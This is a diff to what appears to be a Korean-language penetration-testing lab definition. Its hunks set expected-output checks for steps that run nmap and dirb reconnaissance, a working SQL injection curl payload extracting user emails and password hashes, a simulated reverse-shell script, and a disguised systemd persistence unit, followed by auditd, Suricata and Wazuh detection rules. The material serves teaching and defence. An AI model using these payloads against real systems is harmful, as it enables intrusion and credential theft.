@@ -35,7 +35,7 @@ steps:
     서비스 버전은 CVE 매칭에, 디렉토리 열거는 숨겨진 관리 페이지 발견에 활용된다.
   verify:
     type: output_contains
-    expect: null
+    expect: open
   target_vm: attacker
   script: nmap -sV --top-ports 1000 --max-retries 1 --host-timeout 15s -T4 -oN /tmp/multi_stage_recon.txt
     10.20.30.80 && dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt 2>&1
@@ -54,7 +54,7 @@ steps:
     데이터를 조회한다. 칼럼 수를 맞추는 것이 핵심이며, 사용자 이메일과 비밀번호 해시를 추출할 수 있다.
   verify:
     type: output_contains
-    expect: null
+    expect: email
   target_vm: attacker
   script: curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION%20SELECT%20id,email,password,role,'5','6','7','8','9'%20FROM%20Users--"
     | python3 -m json.tool | head -30
@@ -76,7 +76,7 @@ steps:
     프로세스의 네트워크 연결 모니터링.'
   verify:
     type: output_contains
-    expect: null
+    expect: simulation
   target_vm: attacker
   script: 'cat > /tmp/reverse_shell_sim.py << ''PYEOF'' import socket,subprocess,os
     # SIMULATION ONLY - DO NOT EXECUTE # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -101,7 +101,7 @@ steps:
     가장 효과적인 Persistence 기법이다. systemd는 부팅 시 자동 실행되고, SSH 키는 비밀번호 없이 접속을 허용한다.
   verify:
     type: output_contains
-    expect: null
+    expect: multi-user.target
   target_vm: attacker
   script: cat > /tmp/persistence_service_sim.service << 'EOF' [Unit] Description=System
     Health Monitor After=network.target [Service] Type=simple ExecStart=/bin/bash
@@ -127,7 +127,7 @@ steps:
     change)로 수정 이벤트를 기록하며, -k(key)로 이벤트를 분류한다.
   verify:
     type: output_contains
-    expect: null
+    expect: persistence
   target_vm: secu
   script: cat > /tmp/audit_persistence_rules.conf << 'EOF' -w /etc/passwd -p wa -k
     persistence_account -w /etc/shadow -p wa -k persistence_account -w /etc/crontab
@@ -153,7 +153,7 @@ steps:
     /bin/sh 바이너리 시그니처를 탐지한다.
   verify:
     type: output_contains
-    expect: null
+    expect: UNION SELECT
   target_vm: secu
   script: cat > /tmp/custom_detection.rules << 'EOF' alert http any any -> 10.20.30.0/24
     any (msg:"SQLI Attempt - UNION SELECT"; flow:to_server,established; content:"UNION";
@@ -184,7 +184,7 @@ steps:
     시간 윈도우 내 이벤트 빈도를 추적한다.
   verify:
     type: output_contains
-    expect: null
+    expect: multistage_attack
   target_vm: siem
   script: "cat > /tmp/wazuh_multistage_rule.xml << 'EOF'\n<group name=\"multistage_attack\"\
     >\n  <rule id=\"100110\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n   \
@@ -221,7 +221,7 @@ steps:
     포함한다. Defense-in-Depth 전략의 각 계층별 역할을 명확히 한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Multi-Stage Intrusion Report
   target_vm: attacker
   script: "rm -f /tmp/reverse_shell_sim.py /tmp/persistence_service_sim.service /tmp/apt_key_sim*\
     \ 2>/dev/null && cat > /tmp/pentest_report_week02.txt << 'EOF'\n=== Multi-Stage\
